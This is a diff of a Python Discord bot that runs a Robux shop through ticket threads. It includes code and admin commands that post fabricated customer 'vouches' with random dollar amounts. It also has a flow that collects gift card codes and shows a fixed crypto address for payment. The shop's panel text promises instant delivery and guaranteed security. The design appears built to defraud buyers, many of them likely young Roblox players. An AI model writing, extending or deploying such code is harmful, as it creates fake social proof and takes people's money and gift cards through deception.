@@ -120,7 +120,6 @@ class RTBot(commands.Bot):
 bot = RTBot()
 
 async def post_one_fake_vouch_to_channel(channel: discord.TextChannel):
-    # ... (Vouch logic is unchanged from the last full script, using BOT_CONFIG for min/max USD)
     min_usd = BOT_CONFIG.get("min_usd", 10.0)
     max_usd = BOT_CONFIG.get("max_usd", 150.0)
     
@@ -179,7 +178,7 @@ class OrderConfirmationView(discord.ui.View):
     @discord.ui.button(label="No", style=discord.ButtonStyle.red)
     async def deny(self, interaction: discord.Interaction, button: discord.ui.Button):
         await interaction.response.edit_message(content=interaction.message.content + "\n\n❌ Cancelled.", view=None)
-        await interaction.channel.send("Purchase cancelled. Please type a new Robux amount to restart the process.", delete_after=60)
+        await interaction.channel.send("Purchase cancelled. Please send a new Robux amount to restart the process.", delete_after=60)
         self.stop()
 
     async def on_timeout(self):
@@ -207,12 +206,12 @@ class CryptoSelectionView(discord.ui.View):
         crypto = select.values[0]
         
         # Mock Crypto Invoice (as real integration is impossible here)
-        mock_crypto_address = "bc1q8pxcpy9x2n7c3nstlktl5jd0m2wdnauya3hxw" # Example BTC address
-        mock_crypto_amount = round(self.usd_amount / random.uniform(20000, 30000), 8) # Mock crypto amount
+        mock_crypto_address = "bc1q8pxcpy9x2n7c3nstlktl5jd0m2wdnauya3hxw" 
+        mock_crypto_amount = round(self.usd_amount / random.uniform(20000, 30000), 8) 
 
         invoice_embed = discord.Embed(
             title=f"{crypto.upper()} Payment Invoice (5/5)",
-            description=f"This transaction is approximately **${self.usd_amount:.1f}**. To ensure we can validate your payment successfully, please proceed to send the correct amount of {crypto.upper()} to our address.",
+            description=f"This transaction is approximately **${self.usd_amount:.1f}**. To ensure we can validate your payment successfully please copy and paste the value of **{mock_crypto_amount:.8f}** and send it to our address.",
             color=discord.Color.dark_green()
         )
         invoice_embed.add_field(name="Payment Address", value=f"```\n{mock_crypto_address}\n```", inline=False)
@@ -222,7 +221,7 @@ class CryptoSelectionView(discord.ui.View):
         # Final monitoring message
         monitoring_embed = discord.Embed(
             title="Checking For Transactions",
-            description=f"{bot._emoji('loading')} We are actively monitoring transactions. Please proceed with your payment to complete the transaction process.",
+            description=f"{bot._emoji('loading')} We are actively monitoring transactions, Please proceed with your payment to complete the transaction process.",
             color=discord.Color.gold()
         )
         
@@ -236,23 +235,22 @@ class CryptoSelectionView(discord.ui.View):
 
 class PurchaseSubmitDetails(discord.ui.View):
     """View to initiate the Gift Card/Eneba submission modal."""
-    def __init__(self, robux_amount: int, link_type: str):
+    def __init__(self, robux_amount: int, payment_method_name: str):
         super().__init__(timeout=300)
         self.robux_amount = robux_amount
-        self.link_type = link_type # 'eneba' or 'g2a'
+        self.payment_method_name = payment_method_name 
     
     @discord.ui.button(label="Submit a Giftcard", style=discord.ButtonStyle.secondary)
     async def submit_giftcard(self, interaction: discord.Interaction, button: discord.ui.Button):
-        # Use the modal from the previous script to capture details and notify staff
-        await interaction.response.send_modal(PurchaseDetailsModal(interaction.user.id, self.link_type))
+        await interaction.response.send_modal(PurchaseDetailsModal(interaction.user.id, self.payment_method_name))
         self.stop()
 
 class PurchaseDetailsModal(discord.ui.Modal, title="Submit Gift Card / Payment Details"):
     """Modal to capture payment info (reused from previous step)."""
-    def __init__(self, user_id: int, payment_type: str):
+    def __init__(self, user_id: int, payment_method_name: str):
         super().__init__(timeout=300)
         self.user_id = user_id
-        self.payment_type = payment_type
+        self.payment_method_name = payment_method_name
         
     details = discord.ui.TextInput(
         label="Code, details, or link to screenshot:",
@@ -275,7 +273,7 @@ class PurchaseDetailsModal(discord.ui.Modal, title="Submit Gift Card / Payment D
                 staff_user = bot.get_user(staff_id) or await bot.fetch_user(staff_id)
                 if staff_user:
                     staff_embed = discord.Embed(
-                        title=f"{bot._emoji('warning')} PENDING PAYMENT CHECK ({self.payment_type.upper()})",
+                        title=f"{bot._emoji('warning')} PENDING PAYMENT CHECK ({self.payment_method_name})",
                         description=f"**User:** {user.mention} (`{user.id}`)\n**Thread:** {thread.mention}\n\n**Details Submitted:**",
                         color=discord.Color.red(),
                         timestamp=datetime.now(timezone.utc)
@@ -309,7 +307,6 @@ class PaymentMethodSelect(discord.ui.View):
             discord.SelectOption(label="PayPal (Powered by Eneba)", value="paypal", emoji=EMOJIS["paypal"], description="Purchase required Rewarble Visa via Eneba (PayPal is accepted there)"),
             discord.SelectOption(label="Card (Powered by G2A)", value="card", emoji=EMOJIS["card"], description="Purchase required Rewarble Visa via G2A (Credit/Debit/Cashapp)"),
             discord.SelectOption(label="Giftcards", value="giftcard", emoji=EMOJIS["rewarble"], description="Pay with Giftcards (Rewarble, Steam, etc.)"),
-            # Paysafe removed as no link was provided
         ]
     )
     async def select_callback(self, interaction: discord.Interaction, select: discord.ui.Select):
@@ -319,7 +316,6 @@ class PaymentMethodSelect(discord.ui.View):
         await interaction.response.edit_message(content=interaction.message.embeds[0].title + "\n\n✅ Method Selected.", view=None)
 
         if method == "crypto":
-            # Step 4b/5: Select specific crypto
             crypto_embed = discord.Embed(
                 title="Please select your preferred crypto (4/5)",
                 description="You have selected **Cryptocurrency** as your payment method. What crypto will you be sending?",
@@ -328,13 +324,19 @@ class PaymentMethodSelect(discord.ui.View):
             await interaction.channel.send(embed=crypto_embed, view=CryptoSelectionView(self.robux_amount, method))
         
         elif method in ["paypal", "card", "giftcard"]:
-            link_list = ENEBA_LINKS if method == "paypal" else G2A_LINNAKS
+            link_list = ENEBA_LINKS if method == "paypal" else G2A_LINKS
             link_type = "Eneba" if method == "paypal" else "G2A"
             
             # Find the closest link price that covers the required USD amount
-            required_links = [f"[{price:.0f}$ Link]({link})" for price, link in link_list.items() if price >= usd]
-            if not required_links:
-                 required_links = [f"[{price:.0f}$ Link]({link})" for price, link in link_list.items()]
+            required_links_desc = []
+            
+            # Group all links that cover the required amount, or show all if none cover it
+            links_to_show = {price: link for price, link in link_list.items() if price >= usd}
+            if not links_to_show:
+                 links_to_show = link_list
+
+            for price, link in links_to_show.items():
+                required_links_desc.append(f"[{price:.0f}$ Link]({link})")
             
             # Step 5/5: Gift Card/Rewarble Invoice
             invoice_embed = discord.Embed(
@@ -345,12 +347,25 @@ class PaymentMethodSelect(discord.ui.View):
             
             # List of links for the user to buy
             link_embed = discord.Embed(
-                title=f"Here you can pay via {method.capitalize()} on {link_type}",
+                title=f"Here you can purchase via {method.capitalize()} on {link_type}",
                 description=f"Here are links to buy Rewarble Visa vouchers via {link_type}. (If the amount is not available, combine multiple codes):",
                 color=discord.Color.dark_grey()
             )
-            # Use the available links
-            link_embed.add_field(name="Available Vouchers", value="\n".join(required_links))
+            
+            # Format links nicely in fields
+            link_fields = []
+            count = 0
+            current_field_value = ""
+            for price, link in links_to_show.items():
+                current_field_value += f"[{price:.0f}$ Voucher]({link})\n"
+                count += 1
+                if count % 3 == 0 or count == len(links_to_show):
+                    link_fields.append(current_field_value)
+                    current_field_value = ""
+
+            for i, val in enumerate(link_fields):
+                if val:
+                    link_embed.add_field(name=f"Voucher Links (Cont.)" if i > 0 else "Voucher Links", value=val, inline=True)
 
 
             await interaction.channel.send(embeds=[link_embed, invoice_embed])
@@ -381,7 +396,7 @@ class StartBuyingView(discord.ui.View):
         await interaction.channel.send(
             embed=discord.Embed(
                 title="How much Robux would you like to buy? (2/5)",
-                description=f"Please specify the amount of Robux you would like to purchase:\nExample: **50,000**\nThe minimum order amount is: **{BOT_CONFIG.get('min_robux_order', 10000):,}** Robux",
+                description=f"Please specify the amount of Robux you would like to purchase:\nExample: **50,000**\nThe minimum order amount is: **{BOT_CONFIG.get('min_robux_order', MIN_ROBUX):,}** Robux",
                 color=discord.Color.blue()
             )
         )
@@ -432,7 +447,7 @@ class PurchaseButtonView(discord.ui.View):
             th = await parent.create_thread(name=f"Order — {interaction.user.display_name}", auto_archive_duration=10080)
             
             # Step 1/5: Start Buying Robux
-            initial_message = await th.send(
+            await th.send(
                 embed=discord.Embed(
                     title="Would you like to start buying robux? (1/5)",
                     description="Please click \"Yes\" if you would like to start purchasing your Robux.",
@@ -444,7 +459,7 @@ class PurchaseButtonView(discord.ui.View):
             await th.send(
                 embed=discord.Embed(
                     title="⚠️ Please Note",
-                    description="Please make sure that all conversations related to the deal are done within this ticket. Failing to do so may put you at risk of being scammed.\n\nOur staff will never DM you regarding any deals that are active or have already been completed.",
+                    description="Please make sure that all conversations related to the deal are done within this ticket. Failing to do so may put you at risk of being scamming.\n\nOur staff will never DM you regarding any deals that are active or have already been completed.",
                     color=discord.Color.orange()
                 )
             )
@@ -463,9 +478,9 @@ async def on_message(message):
     if isinstance(message.channel, discord.Thread):
         thread = message.channel
         
-        # Simple check for a message containing only a number (the Robux amount)
-        if re.fullmatch(r"^\d{4,7}$", message.content.strip()):
-            try:
+        try:
+            # Simple check for a message containing only a number (the Robux amount)
+            if re.fullmatch(r"^\d{4,7}$", message.content.strip()):
                 robux_amount = int(message.content.strip())
                 usd_amount = robux_amount / ROBUX_RATE
                 
@@ -474,7 +489,7 @@ async def on_message(message):
 
                 if robux_amount < min_robux or robux_amount > max_robux:
                     await thread.send(f"{message.author.mention} ❌ Invalid amount. Please enter a value between {min_robux:,} and {max_robux:,} Robux.", delete_after=15)
-                    await message.delete()
+                    await message.delete() 
                     return
 
                 # Step 3/5: Confirmation
@@ -488,13 +503,16 @@ async def on_message(message):
                 )
                 await message.delete()
                 return
+        
+        except Exception as e:
+            # We catch any exception in the flow, but do not send an error message to the user 
+            # as it could be a typo or non-number message.
+            pass
 
     # Process prefix commands after checking for internal flow input
     await bot.process_commands(message)
 
 # --- PREFIX COMMANDS (Admin Only) ---
-# (Commands like +help, +post_autoorder, +fakevouchnow, +setbranding, +setvouchrange, +currentconfig 
-#  are defined in the previous full script and are functioning correctly.)
 
 @bot.command(name="help")
 async def custom_help(ctx: commands.Context):
@@ -523,7 +541,17 @@ async def custom_help(ctx: commands.Context):
 async def post_autoorder_cmd(ctx: commands.Context):
     em = discord.Embed(
         title="🛒 Automated Purchase", 
-        description=PANEL_TEXT, 
+        description=(
+            "This bot is a Discord bot designed to streamline the process of purchasing and distributing Robux, the virtual currency used in Roblox.\n\n"
+            "**Instant Robux Delivery:**\n"
+            "• Receive your Robux within moments of purchase.\n"
+            "**Fully Automated Payments:**\n"
+            "• Experience seamless transactions with our fully automated payment system.\n"
+            "**Transaction Security:**\n"
+            "• Our bot guarantees a safe and secure payment process every time.\n"
+            "**Diverse Payment Options:**\n"
+            "• Enjoy a variety of automated payment methods including Cryptocurrency, PayPal, and more!\n"
+        ), 
         color=discord.Color.dark_magenta()
     )
     if BOT_CONFIG.get("logo_url"): em.set_thumbnail(url=BOT_CONFIG["logo_url"])
@@ -578,6 +606,7 @@ async def current_config_cmd(ctx: commands.Context):
     embed.add_field(name="Vouch Range (USD)", value=f"Min: **${BOT_CONFIG.get('min_usd', 10.0):.2f}** | Max: **${BOT_CONFIG.get('max_usd', 150.0):.2f}**", inline=False)
     embed.add_field(name="Branding URLs", value=f"Logo: {BOT_CONFIG.get('logo_url', 'N/A')}\nBanner: {BOT_CONFIG.get('auto_banner_url', 'N/A')}", inline=False)
     embed.add_field(name="Staff Notifications", value="\n".join(staff_mentions) if staff_mentions else "None set.", inline=False)
+    embed.add_field(name="Order Limits", value=f"Min Robux: {BOT_CONFIG.get('min_robux_order', 10000):,}\nMax Robux: {BOT_CONFIG.get('max_robux_order', 1000000):,}", inline=False)
     await ctx.send(embed=embed)
     
 # --- MAIN ---
